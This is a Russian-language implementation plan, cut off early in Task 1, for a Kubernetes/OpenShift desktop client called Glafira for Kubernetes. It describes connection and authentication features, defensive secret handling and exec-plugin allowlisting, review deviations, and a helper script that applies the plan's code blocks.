# O1a «Каркас и подключения» — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Новое приложение Glafira for Kubernetes на основе Glafira for Kafka: подключения к кластерам Kubernetes (в фокусе — OpenShift) по токену, клиентскому сертификату, через браузер (OAuth OpenShift) и exec-плагином из списка разрешённых, адрес API с путём, импорт из kubeconfig, пошаговая проверка подключения, платформа и дистрибутив по discovery, сведения о пользователе, группах API и правах, папки, экспорт и импорт подключений, политика `allowInsecureTls` и `allowExecAuth`, настройки языка, встроенная справка и «О программе».

**Architecture:** Tauri 2 + Rust + React, как Kafka-версия. Общая основа переносится из `~/kafka-explorer` @ `8bbd0bd` скриптом `scripts/port.sh` и правится патчами; каждый перенесённый файл записан в `PORTED.md`. Новое в Rust — `storage/profile.rs` (профиль подключения), `platform/` (определение платформы и групп API по discovery), `k8s/` (клиент `kube` 4.2 из профиля, ошибки, подключение и права, проверка подключения, импорт kubeconfig), `auth/` (вход через браузер: PKCE и loopback-redirect; exec-плагины: список разрешённых, подтверждение строки запуска, запуск), команды в `commands/`. Фронтенд — форма подключения, вкладка подключения, диалог импорта kubeconfig; дерево, раскладка, настройки, справка и «О программе» переносятся.

**Tech Stack:** Rust 2024 (tauri 2, kube 4.2 + k8s-openapi 0.28 `v1_32`, reqwest 0.13 `rustls-no-provider`, rustls 0.23 ring, tokio с `process`, serde, keyring 3, url, pem, sha2, getrandom, time, regex, dirs, tower-test), TypeScript (React 19, TanStack Query 5, zustand 5, i18next, react-markdown 9.1, @floating-ui/react), Vitest, pnpm 11, kind для интеграционных тестов.

**Спецификация:** `docs/superpowers/specs/2026-10-24-glafira-kubernetes-design.md`. Этап O1 разделён на два плана: этот (O1a) и O1b «Чтение кластера» (обзор кластера с `/readyz` и классами Ingress и Gateway, проекты, workloads, поды, события, сеть — Services, Routes, Ingress, Gateway, HTTPRoute, GRPCRoute, — конфигурация, хранилище, квоты, YAML, логи, watch, срок токена) — O1b пишется после O1a и опирается на его клиент, пул, платформу и вкладки. Уточнения спеки по итогам прототипа (§2, §4.2, §4.3, §5.2, §5.3, §5.5, §19; внесены в спеку коммитом `fca26b4`):
- заданный CA подключения заменяет системные корни при проверке API-сервера (так `kube` 4.2 обрабатывает `certificate-authority`), а для OAuth-сервера добавляется к ним;
- exec-плагин запускает Glafira, а не `kube`: в `kube` 4.2 запуск блокирующий, без таймаута и отмены, а текст его ошибки содержит переменные окружения. Учётные данные держит пул до `expirationTimestamp` и за минуту до срока запускает плагин снова;
- список разрешённых сверяет первые позиционные аргументы: ведущие ключи `--ключ значение` пропускаются (`aws eks update-kubeconfig` пишет `--region` перед `eks get-token`);
- подтверждение человека хранится в профиле как отпечаток (SHA-256) строки запуска; принимается только от формы (`confirmExec`) и диалога импорта kubeconfig (`approveExec`); файл обмена переносит строку без подтверждения и без значений переменных, похожих на секреты;
- новая команда `resolve_exec_command` — кнопка «Найти» в форме; у проверки подключения — шаг `exec` между TCP и TLS;
- трейт `Platform` с адаптерами появится в O1b вместе с первым поведением, которое зависит от платформы (обзор кластера); в O1a — `platform::detect` и `ApiGroups`. `PlatformInfo` дополнительно несёт готовое название `label`;
- совпадение контекста kubeconfig с сохранённым подключением — по имени и адресу API (имени пользователя профиль не хранит);
- `k8s-openapi` 0.28 поддерживает API с 1.32 (`v1_32` — самая ранняя фича); используются только GA-группы (`core/v1`, `authentication`, `authorization`), совместимые с Kubernetes 1.29;
- в O1a нет обновлений, архива диагностики (O6), полей LLM (O2), метрик (O3), guard изменений и `ConfirmDialog` (O3); языков два — en и ru (O6 добавит остальные 10).

**Проверено до написания плана.** Весь код плана собран и прогнан в отдельной копии репозитория (по коммиту на задачу); повторное применение всех блоков плана в пустом каталоге даёт то же дерево побайтно (кроме генерируемых `pnpm-lock.yaml` и `src-tauri/Cargo.lock`), проверки после каждой задачи — зелёные (числа ниже — на момент написания плана; что изменилось при выполнении и каковы числа сейчас — в разделе «Отступления при выполнении»):
- Rust — 182 unit-теста (`cargo test --lib`; было 1 после задачи 1), clippy с `-D warnings`, `cargo fmt --check`; интеграционные `tests/it_connect.rs` — 4 (собраны; без `GO_IT_KUBECONFIG` пропускаются); `cargo deny` — `licenses ok`, `advisories ok`; в дереве зависимостей нет `aws-lc-rs` и `openssl-sys`;
- фронтенд — 177 тестов в 31 файле, `tsc --noEmit`, `pnpm build` с проверкой совместимости бандла с WebKit macOS 11, `pnpm i18n:check` (словари en и ru, 126 вызовов из Rust, 2 главы руководства на двух языках);
- скрипты — 54 теста (`pnpm test:scripts`); шаги «Увидеть падение» проверены — тесты фронтенда падают до реализации.
Не проверено: интеграционные тесты против настоящего кластера kind (в копии они собраны и без `GO_IT_KUBECONFIG` пропускаются — скачать и запустить kind при подготовке плана было нельзя), вход через браузер на OpenShift (покрыт тестом против фейкового OAuth-сервера), настоящие exec-плагины (`kubectl oidc-login`, облачные; в тестах — скрипты `sh` с именем `kubectl`, только на unix), запуск плагинов на Windows и PATH оболочки входа вне macOS. Всё это — смоук, задача 20.

## Отступления при выполнении

Блоки кода этого плана воспроизводят состояние **до ревью**: так их собирал и проверял прототип. Поверх каждой задачи в ветке `worktree-o1a` лежат fix-коммиты ревью (`git log --oneline 94d0a49..HEAD`: `fix:` и `docs:`), **источник истины — ветка**. Блоки заново поверх ветки не применять: они вернут исправленные дефекты. Итоговое поведение записано в спеке (§2, §5.1–5.3, §5.5, §12, §13, §15). Номера строк ниже — в этом файле, с этим разделом; для блоков указан и id. Задачи 1–3, 6 и 19 прошли ревью без fix-коммитов.

| Задача | Что изменилось | Коммит | Устаревшие места плана |
|---|---|---|---|
| 4 | PEM с блоком `PRIVATE KEY` в `certificate_pem` и `ca.pem` отклоняется (`errors.connections.pemContainsKey`), экспорт такие блоки вырезает; `user:pass@` в адресе API и прокси отклоняется (`credentialsInUrl`) | `8c7acbe` | `validate_profile` (блок `t04-…-profile-rs-impl`, 3570; сама функция 3738); экспорт и разбор файла (патч `t04-port-…-exchange-rs`, 2644–2952); ключей `pemContainsKey` и `credentialsInUrl` нет в блоках `locales` — они только в `src/locales/*.json` |
| 5 | Пароль прокси не попадает в текст `badProxyUrl`; схема прокси — только http и https; встроенный повтор `kube` выключен (`default_retry = false`) | `78abbea` | `invalid_url` (4401) и блок прокси в `build_kube_config` (4458), блок `t05-…-config-rs-impl` (4356) |
| 7 | Любой ответ сервера на «кто я» (401, 403, 404, 429, 5xx…) — это TLS ✓ и ошибка на шаге «Вход»; шаг TLS падает только от сетевой ошибки, ошибки TLS и таймаута | `0a593cd`, `9c9ee68` | `check_cluster` (6432–6482, ветки `Err(e) if matches!(…)` и `Err(e)`), тесты шагов (блок `t07-…-connectivity-rs-tests`, 6089) |
| 8 | Вход через браузер: таймаут чтения на соединение, ошибка одного соединения не рвёт вход, отмена до открытия браузера, схемы адресов OAuth — только http и https, пустой `access_token` — ошибка; отказ (`error=`) принимается только с верным `state`, чужой запрос ожидание не сбивает. Ключ `errors.oauth.stateMismatch` больше не используется и удалён из словарей (`83a52c4`) | `2a95a7c`, `1a1891b` | блоки `t08-…-callback-rs-impl` (7102) и `…-oauth-rs-impl` (7275), их тесты (6737, 6835); `errors.oauth.stateMismatch` в тесте (6799), коде (7228) и словарях (12187, 12341) |
| 9 | Повторный импорт файла обмена поверх существующего подключения сохраняет секреты exec-плагина (`inherit_secrets`) и подтверждение, если строка с ними не изменилась; значения секретных аргументов (`--oidc-client-secret=…`, `--client-secret …`) не экспортируются (`blank_secret_args`), скрыты (`mask_secret_args`) и в `Debug`; секретное имя — с TOKEN, SECRET, PASS, KEY, CREDENTIAL, BEARER или COOKIE | `844f42a` | `is_secret_name` (7920, прежний список без PASS, BEARER, COOKIE); патч `exchange.rs`: `strip_exec_for_export` (8123, чистит только переменные), ветка обновления существующего (8184), тест (8198) |
| 10 | Вывод плагина и причина `badOutput` маскируются и по значениям секретных аргументов; адреса в ошибках без паролей (`redact_url`: `badApiUrl`, `badProxyUrl`, `invalid_url`, OAuth); относительный путь команды отклоняется (`commandNotAbsolute`); `require_approved` — единственное место отказа `notApproved`; `parse_exchange` нормализует профиль до проверки; второй проход экспорта и второй разбор прокси свёрнуты | `04323ff` | патч `t10-src` (8507–9742): `mask_output` (8622, вызов 8802), `run` (8735), `ensure_exec_approved` (9287); `invalid_url` (4401), `validate_profile` (3738) |
| 11 | `ImportedContext` — ручной `Debug` без токена и ключа (`derive(Debug)` убран); несовпадение предпросмотра и контекста — `errors.internal`, а не `expect`; тесты закрытого порта берут порт 1 (как тест в `errors.rs`), а не освобождённый порт слушателя | `a9d756c` | `ImportedContext` (10136), `expect` (10411, 10420), `drop(listener)` в тестах задачи 7 (6205, 6266) |
| 12 | Политика проверяется во всех путях к кластеру (`AppState::connected`, вход через браузер, страница токена); команды ищутся только среди исполняемых файлов (бит `x`, `is_executable_file`); токен входа через браузер переживает повторный импорт; импорт без частичного результата (сначала разбор всех контекстов, ошибка называет контекст); предпросмотр для webview без секретов (`preview_for_ui`); `Debug` у `SecretsInput` и `ConnectionInput` без секретов; `Set` секретов раньше `Delete`; `#[cfg(unix)]` у `write_test_file` в тестах команд | `4ef9791`, `83a52c4` | `p.is_file()` (10941, 11253), `ensure_allowed` (10909, 11077, 11169), `derive(Debug)` у `SecretsInput` и `ConnectionInput` (10984, 10993), `apply_blocking` (11314), `AppState::connected` (9698) |
| 13 | Тесты без предупреждений `act`; тест API-клиента (`client.test.ts`); мёртвый ключ `errors.oauth.stateMismatch` убран из словарей | `83a52c4` | словари (12187, 12341), блок `t13-src-api-client-ts` (11639) без теста клиента |
| 14 | `isSecretName` и `launchLine` совпадают с Rust (те же слова, значения секретных аргументов `--имя=значение` и `--имя значение` скрыты); подтверждение exec привязано к строке: форма хранит ключ подтверждённой строки (`launchKey`), `confirmExec` — совпадение с ним, смена способа входа подтверждение сбрасывает; подсказка `execLine` говорит и о параметрах | `2ae17a6`, `bbb8ef6` | `exec.ts` (13309, `isSecretName` 13346, `launchLine` 13357), `ConnectionForm.tsx` (`confirmExec` флагом: 12904, 12945, 12962–12967, 13145) и его тесты (12452), `exec.test.ts` (12703), подсказка `execLine` (13617, 13707) |
| 15 | Ожидание exec-плагина и «Отменить» при любом запуске плагина, а не только при первом подключении; блоки ожидания сведены в `LoginWait`; отмена входа через браузер без баннера «Вход отменён»; один запуск за раз: подключение заново идёт через `reconnect(queryClient, id)` на `fetchQuery`, вход через браузер и сохранение токена имеют общий ключ мутаций (`sessionMutationKey`), «Подключиться заново» недоступна, пока идёт запуск, вход или сохранение токена, а «Сохранить токен» и «Войти через браузер» — пока идёт подключение или другой вход | `09e908a`, `ca50577`, `7947fa7` | `ConnectionPanel.tsx` (13932; `reconnect` 13974, ожидание при `isPending`), `SessionActions.tsx` (14084; `login` 14108, `done` 14106, `rerun` 14110, `isPending` 14140, 14164), тесты (13754) |
| 16 | Глава «Подключения» (en, ru): исключение для секретов exec-плагина — они в файле подключений, не в экспорте | `6938fd7` | блоки `t16-docs-guide-en-connections-md` (14656) и `…-ru-connections-md` (14777): введение, «Exec-плагины», «Импорт из kubeconfig» |
| 17 | Подтверждение exec в импорте kubeconfig — по отпечатку показанной строки: предпросмотр отдаёт `launchFingerprint`, `approveExec` — отпечатки, а не имена контекстов; файл, изменённый после предпросмотра, импортируется неподтверждённым; после сбоя применения список и предпросмотр перечитываются; запросы обновлённых подключений сбрасываются `resetQueries`; ошибка выбора файла — в баннере | `0a083ba`, `c423149` | `approveExec` как имена: Produces задачи 12 (10525), описание (10527), `approve_exec` и `apply_blocking` (10741, 11265–11330), тест (10854), `api.applyKubeconfigImport` (11700–11702), Produces задачи 13 (11423); `KubeContext` без `launch_fingerprint` (10109, 11919); диалог (описание 15226, `allowed` по имени 15412, `approveExec` и `invalidateQueries` 15467–15469) и тесты (15230) |
| 18 | `QueryClient`: `refetchOnReconnect: false` — смонтированные вкладки при возвращении сети заново запускали бы `connect` (exec-плагин, вход через браузер); чистый вывод тестов дерева и справки | `3772c53` | `defaultOptions` в `App.tsx` (12045–12046, контекст патча 16727) |
| 20 | README, смоук, руководство, глоссарий и правила локализации приведены к коду: секреты exec-плагина, подтверждение по отпечатку, импорт kubeconfig, пункты смоука 19–23 | `5a62dbd`, `7947fa7` | блоки `t20-readme-md` (17356), `t20-docs-i18n-readme-md` (17429), `t20-docs-i18n-glossary-md` (17478), `t20-docs-smoke-o1a-md` (17523): актуальные тексты — в `README.md`, `docs/smoke/o1a.md`, `docs/i18n/` |
| Итоговое ревью, I1 | Сохранение без галочки оставляет прежнее подтверждение, только если оно совпадает с отпечатком сохраняемой строки, иначе `approved = None` (`set_exec_approval`, общий для формы и импорта kubeconfig) | `12ef31f` | описание «без флага остаётся прежнее» (10527), `set_exec_approval` (11007), тест (10640) |
| Итоговое ревью, I2 | Импорт файла обмена с «Обновлять существующие»: если у обновляемого подключения есть токен, ключ или подтверждённый exec-плагин и меняются адрес API, прокси, CA или имя сервера TLS, в `ImportPreview.warnings` — `messages.import.addressChanged`, `proxyChanged`, `tlsChanged`; `plan_import` получил параметр `secrets` | `12ef31f` | сигнатура и ветка обновления `plan_import` (2845, 2912, 8184), вызов в `commands/folders.rs` (патч 1780) |
| Итоговое ревью, I3 | После импорта файла обмена запросы обновлённых подключений сбрасываются (`resetQueries`), как после импорта kubeconfig; отмена входа exec-плагина в форме не оставляет необработанный отказ | `12ef31f` | диалог импорта файла обмена переносится из Kafka-версии, блока в плане нет; `cancelOauthLogin` без `catch` в форме (13266) |
| Итоговое ревью, I4 | `ALLOWED` — таблица команд (`AllowedCommand`: аргументы, ключи со значением, `_` = `-` у kubectl и oc); ведущий ключ берёт значение, только если он в таблице, прочие — флаги, на `--` и `-` разбор останавливается; новый отказ `errors.exec.argsNotAllowedWithOptions`. Запрещены переменные окружения, меняющие код команды (`is_forbidden_env`, `errors.exec.envForbidden`): при сохранении, импорте, в предпросмотре kubeconfig и в `run()`; `PATH` плагину всегда задаёт Glafira | `2fe3cdb` | `ALLOWED`, `positional`, `check_allowed` (блок `t09-…-exec-rs-impl`, 7830; 7845, 7885, 7894), тест `allowlist_table` (7627), `validate_exec` (8320), `run()` и PATH (8735–8754) |
| Повторное ревью I4 | Ведущие ключи — по умолчанию запрет: у команды два списка (`LeadingOptions`: ключи со значением и флаги), любой другой ведущий ключ в любой записи — отказ `errors.exec.unknownOption` с его именем, флаг с `=` — `flagWithValue`, у kubectl ведущих ключей нет вовсе (`optionBeforePlugin`); при допустимых ключах и не той подкоманде — `argsNotAllowed`; ключ `argsNotAllowedWithOptions` удалён. В запрещённых переменных — ещё `PATHEXT` и `COMSPEC`. Импорт файла обмена читает keychain до блокировки записи хранилища (`StoredSecrets`), сбой keychain — «учётные данные есть» | `fix(exec): незнакомые ведущие ключи…` (следующий после `87be7f1`) | те же места, что у I4: `ALLOWED`, `positional`, `check_allowed` (7830; 7845, 7885, 7894), тест `allowlist_table` (7627); `plan_import` (2845, 2912, 8184) и его вызов в `commands/folders.rs` (патч 1780) |
| Шапка плана | Подтверждение принимает форма (`confirmExec`) и диалог импорта kubeconfig — по отпечатку показанной строки, а не по `approveExec` как именам; ведущие ключи exec-плагина — по таблице каждой команды | `0a083ba`, `2fe3cdb` | «Уточнения спеки» (строки 14 и 15) |
| Ожидаемые числа | В строках `Expected:` числа до ревью: Rust 1, 19, 46, 96, 108, 122, 131, 142, 152, 167, 172, 182; фронтенд от 37 тестов в 11 файлах до 177 в 31; «вызовов из Rust: 126» | все fix-коммиты | строки `Expected:` (742–17613) и шапка (23–25); текущие числа — ниже |

**Числа сейчас** (ветка `worktree-o1a`):
- Rust: `cargo test --lib` — 258 тестов; интеграционные `tests/it_connect.rs` — 4, прогнаны против kind (`dev/kind/setup.sh`, `GO_IT_KUBECONFIG`), без кластера пропускаются;
- фронтенд: `pnpm test` — 215 тестов в 32 файлах;
- `pnpm i18n:check`: словари en и ru согласованы, вызовов из Rust: 132 (в плане 126: набор ключей изменился после ревью — добавлены, например, `unknownOption`, `flagWithValue`, `optionBeforePlugin`, `envForbidden`, предупреждения импорта файла обмена, убран `stateMismatch`);
- скрипты: `pnpm test:scripts` — 54 теста;
- clippy с `-D warnings` и `cargo fmt --check` чистые.

Смоук `docs/smoke/o1a.md` (24 пункта) в окне приложения на момент написания не пройден (итоговое ревью, I6); пункты 19–24 написаны по коду.

**Решения пользователя во время выполнения** (отступления от плана):
- Задача 4: PEM с блоком `PRIVATE KEY` в полях сертификата и CA отклоняется, экспорт такие блоки вырезает; `user:pass` в адресе API и прокси отклоняется.
- Задача 5: пароль прокси вырезается из текста ошибки; схема прокси — только http и https; встроенный повтор `kube` выключен.
- Задача 7: ответы сервера на «кто я» — TLS ✓ и ошибка на шаге «Вход»; группы пользователя на этом шаге (спека §5.3) отложены в O1b.
- Задача 8: loopback-сервер входа через браузер устойчив к лишним соединениям; отмена до открытия браузера; адреса OAuth — только http и https; пустой `access_token` — ошибка.
- Задача 9: секретные значения аргументов и переменных exec-плагина остаются в `connections.json` (0600, как kubeconfig), но не экспортируются и скрыты в строке запуска и в `Debug`; описано в спеке (§5.1, §5.2, §12, §13), README и справке. Требование к O2 (`list_connections`) и O6 (архив диагностики): маскировать `ExecAuth` так же.
- Общее, после задачи 8: Important-дефекты кода плана, не противоречащие спеке, исправляются без вопроса и перечисляются в итоге; спрашивать нужно про поведение из спеки и продуктовые решения.
- Итоговое ревью, I1–I3: исправлены без вопроса (устаревшее подтверждение, предупреждение при смене адреса в импорте файла обмена, свежая вкладка после импорта).
- Итоговое ревью, I4: таблица ключей со значением для каждой разрешённой команды, остальные ведущие ключи — флаги; отказ для переменных окружения, меняющих код команды; спека §5.2 поправлена. После повторного ревью — по умолчанию запрет: незнакомый ведущий ключ в любой записи — отказ, у kubectl ведущих ключей нет вовсе; keychain при импорте файла обмена читается до блокировки хранилища.
- Итоговое ревью, I6: поставить kind через Homebrew, прогнать `dev/kind/setup.sh` и `it_connect`, запустить `pnpm tauri dev`; ручной смоук в окне — за пользователем.

**Отложено в O1b** (до новых пользователей `AppState::connected`): группы пользователя на шаге «Вход»; кэш неудачи для ожидающих `connect_lock` (каждый перезапускал бы плагин); ключ `Logins` проверки подключения (`test:<id>`); завершение группы процессов плагина; скрытие секретов в полях формы до «Показать».

## Блоки кода

Код переносится как есть. Перед каждым блоком стоит HTML-комментарий `<!-- block: <вид> <id> step=<задача>.<шаг> [path=…] [part=…] [mode=…] -->`: `shell` — команды bash из корня репозитория; `file` — новый файл по `path` (у Rust-файлов с тестами две части: `part=tests` — модуль тестов, `part=impl` — реализация, итоговый файл = реализация, пустая строка, модуль тестов); `patch` — патч `git diff` (применять `git apply --recount`); `locales` — фрагмент словарей для `scripts/merge-locales.mjs`. Ограждения — четыре и больше обратных кавычек: внутри встречаются тройные. Блоки не перепечатывайте: их применяет скрипт ниже, по шагам, в порядке появления в плане.

Скрипт извлекается из этого плана один раз, до задачи 1 (план лежит в `docs/superpowers/plans/` репозитория):

```bash
awk '/^<!-- block: helper o1a-blocks.py -->$/{f=1;next} f&&/^````/{n++; if(n==2) exit; next} f' \
  docs/superpowers/plans/2026-10-24-glafira-kubernetes-o1a.md > /tmp/o1a-blocks.py
python3 /tmp/o1a-blocks.py list | head
```

<!-- block: helper o1a-blocks.py -->
````python
#!/usr/bin/env python3
"""Блоки плана O1a: извлечение и применение по шагам.

Использование (из корня репозитория):
  python3 /tmp/o1a-blocks.py list                 — все блоки: id, вид, шаг, путь
  python3 /tmp/o1a-blocks.py get <id>             — содержимое блока в stdout
  python3 /tmp/o1a-blocks.py step <задача>.<шаг>  — применить блоки шага по порядку
План — $PLAN или docs/superpowers/plans/2026-10-24-glafira-kubernetes-o1a.md.

Виды блоков: shell — команды bash из корня репозитория; file — файл по path (part=tests пишет модуль тестов,
part=impl ставит реализацию перед ним через пустую строку; mode — права); patch — `git apply --recount`;
locales — строки словарей для `scripts/merge-locales.mjs`.
"""
import os
import re
import subprocess
import sys

PLAN = os.environ.get("PLAN", "docs/superpowers/plans/2026-10-24-glafira-kubernetes-o1a.md")
BLOCK = re.compile(r"<!-- block: (\w+) (\S+)((?: \w+=\S+)*) -->\n(`{4,})[\w-]*\n(.*?)\n\4\n", re.S)


def blocks():
    text = open(PLAN, encoding="utf-8").read()
    for m in BLOCK.finditer(text):
        attrs = dict(a.split("=", 1) for a in m.group(3).split())
        yield {"kind": m.group(1), "id": m.group(2), "body": m.group(5) + "\n", **attrs}


def write_file(b):
    path = b["path"]
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    part = b.get("part", "whole")
    body = b["body"]
    if part == "impl" and os.path.exists(path):
        body = body + "\n" + open(path, encoding="utf-8").read()
    with open(path, "w", encoding="utf-8") as f:
        f.write(body)
    if "mode" in b:
        os.chmod(path, int(b["mode"], 8))


def apply(b):
    kind = b["kind"]
    if kind == "shell":
        subprocess.run(["bash", "-euo", "pipefail", "-c", b["body"]], check=True)
    elif kind == "file":
        write_file(b)
    elif kind == "patch":
        subprocess.run(["git", "apply", "--recount", "--whitespace=nowarn"], input=b["body"].encode(), check=True)
    elif kind == "locales":
        subprocess.run(["node", "scripts/merge-locales.mjs"], input=b["body"].encode(), check=True)
    else:
        sys.exit(f"неизвестный вид блока {kind}")


def main():
    cmd, *args = sys.argv[1:] or ["list"]
    all_blocks = list(blocks())
    if cmd == "list":
        for b in all_blocks:
            print(b["id"], b["kind"], b.get("step", ""), b.get("path", ""))
    elif cmd == "get":
        sys.stdout.write(next(b for b in all_blocks if b["id"] == args[0])["body"])
    elif cmd == "step":
        chosen = [b for b in all_blocks if b.get("step") == args[0]]
        if not chosen:
            sys.exit(f"в шаге {args[0]} нет блоков")
        for b in chosen:
            print(f"→ {b['id']} ({b['kind']}{', ' + b['path'] if 'path' in b else ''})")
            apply(b)
    else:
        sys.exit(__doc__)


if __name__ == "__main__":
    main()
````

## Global Constraints

- Кластеры: OpenShift 4.16+ (OCP, OKD, ROSA, ARO, OSD) и любой Kubernetes 1.29+. Платформа — `openshift`, если есть группа `config.openshift.io`, иначе `kubernetes` (Platform V DropApp — тоже, до адаптера этапа O5); какие объекты показывать, решают группы API (`ApiGroups`), а не платформа.
- `kube` 4.2 с фичами `client`, `rustls-tls`, `ring`, `http-proxy` (без `default-features`); `k8s-openapi` 0.28 с фичей `v1_32`. В дереве зависимостей нет `aws-lc-rs` и OpenSSL: `reqwest` 0.13 — с `rustls-no-provider`, провайдер ring ставит `tls::ensure_crypto_provider()` при запуске и в HTTP-клиенте входа.
- Секреты — только в системном хранилище (сервис `glafira-kubernetes`, ключи `<id>/token` и `<id>/clientKey`); в `connections.json`, экспорте, логах и ответах команд их нет. Исключение, решённое пользователем во время выполнения: секретные значения переменных и аргументов exec-плагина (имена с TOKEN, SECRET, PASS, KEY, CREDENTIAL, BEARER, COOKIE) остаются в `connections.json` (0600, как в kubeconfig), но не экспортируются, скрыты в строке запуска и в `Debug`. Приватный ключ в полях PEM и `user:pass` в адресах API и прокси запрещены. Exec-плагины запускаются только из списка разрешённых, по абсолютному пути, без оболочки и после подтверждения строки запуска человеком.
- Ведущие ключи exec-плагина перед аргументами разбираются по таблице ключей со значением каждой команды (`ALLOWED`), прочие ведущие ключи — флаги; переменные окружения профиля, меняющие код команды (`PATH`, `LD_*`, `DYLD_*`, `PYTHON*`, `NODE_OPTIONS` и др.), запрещены (`is_forbidden_env`), `PATH` плагину всегда задаёт Glafira.
- Идентификаторы: продукт «Glafira for Kubernetes», `io.github.vvnovg.glafira.kubernetes`, бинарь `glafira-kubernetes`, библиотека `glafira_kubernetes_lib`, файл обмена `*.glafira-kubernetes-connections.json` (формат `glafira-kubernetes-connections`, версия 1).
- Политика: `updatesEnabled`, `updateUrl`, `language`, `mcpEnabled`, `allowInsecureTls` (`false` — нельзя сохранить, импортировать, проверить и подключить подключение с CA `insecure`), `allowExecAuth` (`false` — то же для подключений с exec-плагином).
- Тексты интерфейса и Rust — ключами в `src/locales/en.json` и `ru.json` (en — эталон ключей и английского текста Rust, ru — эталон смысла); строки добавляются фрагментами `node scripts/merge-locales.mjs`; в строковых литералах Rust вне тестов кириллицы нет; подсказка en — не длиннее 200 символов. `pnpm i18n:check` проходит после каждой задачи с фронтендом.
- Проверки после каждой задачи (что применимо): `cargo test --manifest-path src-tauri/Cargo.toml --lib`, `cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings`, `cargo fmt --manifest-path src-tauri/Cargo.toml --check`; `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm i18n:check`, `pnpm test:scripts`, `pnpm build`.
- Тесты Rust не ходят в сеть, кроме локальных сокетов на `127.0.0.1`; ответы API-сервера — мок `k8s::testing::mock_client`, OAuth — фейковый HTTP-сервер в тесте, exec-плагины — скрипты `sh` во временном каталоге (только unix). Интеграционные тесты без `GO_IT_KUBECONFIG` пропускаются.
- `pnpm-lock.yaml` создаёт `pnpm install` (задача 1), `src-tauri/Cargo.lock` — cargo; оба коммитятся.
- Репозиторий Kafka-версии — `~/kafka-explorer` (или `$KAFKA_REPO`), коммит `8bbd0bd` в нём должен существовать.
- Комментарии, сообщения коммитов и документы — на русском, в стиле Kafka-версии. Коммит — `git commit -s`, последняя строка сообщения — `Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>`. Push — только с согласия пользователя.

## Структура файлов

| Файл | Ответственность |
|---|---|
| `PORTED.md`, `scripts/port.sh` | перенос из Kafka-версии: откуда взят файл и с какими правками |
| `src-tauri/src/{i18n,error,sync,secrets,logging,dock_name,product,tls}.rs`, `storage/fs.rs` | основа: тексты, ошибки, блокировки, keychain, журнал, имя продукта, криптопровайдер |
| `src-tauri/src/policy/`, `settings.rs`, `state.rs`, `commands/{mod,settings,app}.rs` | политика, язык, общее состояние, служебные команды |
| `src-tauri/src/storage/{profile,connections,tree,exchange}.rs` | профиль подключения (в том числе exec-плагин), хранилище подключений, папки, экспорт и импорт |
| `src-tauri/src/platform/mod.rs` | платформа, дистрибутив и группы API по discovery — чистые функции |
| `src-tauri/src/k8s/{config,errors,cluster,pool,connectivity,kubeconfig,testing}.rs` | клиент `kube` из профиля, ошибки, «кто я», discovery и права, пул, проверка подключения, импорт kubeconfig, мок API-сервера |
| `src-tauri/src/auth/{mod,pkce,callback,oauth,exec}.rs` | идущие входы, вход через браузер (PKCE, loopback-redirect, OAuth-сервер), exec-плагины |
| `src-tauri/src/commands/{connections,folders,auth,kubeconfig}.rs` | команды Tauri подключений, папок, входа и импорта kubeconfig |
| `src-tauri/tests/it_connect.rs`, `dev/kind/` | интеграция с kind |
| `src/api/`, `src/i18n/`, `src/lib/`, `src/state/`, `src/locales/` | IPC-контракт, локализация, утилиты, вкладки |
| `src/components/connections/` | форма, профиль, exec-плагин, дерево, импорт подключений и kubeconfig |
| `src/components/cluster/` | вкладка подключения и вход заново |
| `src/components/{common,settings,help,about}/`, `src/guide/`, `docs/guide/` | общие компоненты, настройки, справка, «О программе», главы руководства |
| `scripts/{i18n-check,merge-locales,guide-publish,check-dist-compat}.mjs` | проверки словарей и бандла, добавление строк, публикация руководства |
| `.github/workflows/ci.yml`, `deny.toml`, `docs/{admin,i18n,smoke}/` | CI, лицензии и уязвимости, примеры политики, правила локализации, смоук |

### Task 1: Каркас репозитория, инструменты переноса и сборки

**Files:**
- Port: `.gitattributes`, `.gitignore` (с правками), `LICENSE`, `index.html` (с правками), `pnpm-workspace.yaml`, `public/app-icon.svg`, `scripts/check-dist-compat.mjs` (с правками), `scripts/check-dist-compat.test.mjs` (с правками), `src-tauri/.gitignore`, `src-tauri/build.rs`, `src-tauri/capabilities/default.json`, `src-tauri/icons/128x128.png`, `src-tauri/icons/128x128@2x.png`, `src-tauri/icons/32x32.png`, `src-tauri/icons/icon.icns`, `src-tauri/icons/icon.ico`, `src-tauri/icons/icon.png`, `src/polyfills.test.ts`, `src/polyfills.ts`, `src/styles.css`, `src/vite-env.d.ts`, `tsconfig.json`, `tsconfig.node.json`, `vite.config.ts`, `vitest.config.ts`
- Create: `CONTRIBUTING.md`, `NOTICE`, `PORTED.md`, `SECURITY.md`, `TRADEMARK.md`, `package.json`, `scripts/port.sh`, `src-tauri/Cargo.toml`, `src-tauri/src/lib.rs`, `src-tauri/src/main.rs`, `src-tauri/src/product.rs`, `src-tauri/tauri.conf.json`, `src/App.test.tsx`, `src/App.tsx`, `src/main.tsx`, `src/test/setup.ts`

**Interfaces:**
- Produces: `glafira_kubernetes_lib::product::{PRODUCT_NAME = "Glafira for Kubernetes", IDENTIFIER = "io.github.vvnovg.glafira.kubernetes", KEYCHAIN_SERVICE = "glafira-kubernetes", POLICY_VENDOR = "Glafira", POLICY_PRODUCT = "Kubernetes", CLIENT_NAME = "glafira-kubernetes"}`; бинарь `glafira-kubernetes`, библиотека `glafira_kubernetes_lib`; `scripts/port.sh <путь в kafka-explorer> <путь здесь>` копирует файл с коммита `8bbd0bd`.

Пустой Tauri-проект с именем продукта, перенос инструментов Kafka-версии (TypeScript, Vite, Vitest, проверка совместимости бандла с WebKit macOS 11, значки, юридические документы с товарными знаками The Linux Foundation, Red Hat и Platform V DropApp) и скрипт `scripts/port.sh`, которым дальше переносится общий код. `PORTED.md` — таблица перенесённых файлов: при исправлении общей части её нужно перенести в другой проект. В `check-dist-compat.mjs` исправлено ложное срабатывание `...at(` (spread перед функцией, которую минификатор назвал `at`) — это исправление нужно и Kafka-версии.

- [ ] **Step 1: Перенос из Kafka-версии.**

Файлы копируются с коммита `8bbd0bd` и правятся патчами (правки — против перенесённого файла).

<!-- block: file t01-scripts-port-sh step=1.1 path=scripts/port.sh mode=755 -->
